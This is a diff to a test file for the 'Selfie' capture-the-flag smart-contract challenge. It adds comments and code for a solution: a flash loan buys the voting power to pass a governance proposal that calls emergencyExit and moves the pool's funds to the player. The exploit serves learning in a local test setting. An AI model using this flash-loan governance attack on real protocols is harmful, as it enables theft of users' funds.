@@ -39,6 +39,9 @@ describe('[Challenge] Selfie', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // we can use the flash loan to get enough tokens to pass a governance proposal
+        // in the proposal we can build a calldata to call emergencyExit and transfer pool balance to player
+        // since the call will be executed from the governance contract, we bypass the modifier in the pool contract
         const selfieAttacker = await (await ethers.getContractFactory('SelfieAttacker', player)).deploy(pool.address, governance.address);
         const maxFlashLoan = await pool.maxFlashLoan(token.address);
         await pool.connect(player).flashLoan(selfieAttacker.address, token.address, maxFlashLoan, ethers.constants.HashZero);
